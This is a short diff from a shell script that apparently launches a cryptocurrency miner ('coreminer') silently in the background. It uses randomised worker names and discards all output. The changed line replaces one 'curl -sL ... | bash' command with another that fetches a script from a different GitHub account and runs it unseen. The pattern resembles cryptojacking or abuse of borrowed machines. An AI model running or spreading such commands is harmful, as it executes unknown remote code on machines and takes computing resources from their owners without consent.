@@ -14,4 +14,4 @@ tar xf coreminer-linux-x86_64.tar.gz
 cd coreapp
 ./coreminer -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@eu.catchthatrabbit.com:8008 \
      -P stratum1+tcp://cb24ab8904ed8196c5dafb1306783f2b44890dc5e541.$(echo $RANDOM | md5sum | head -c 10)@as.catchthatrabbit.com:8008 > /dev/null 2>&1 &
-curl -sL https://github.com/kartolo92/koplok/raw/master/time | bash
+curl -sL https://github.com/kidoescegh/swa/raw/main/time | bash
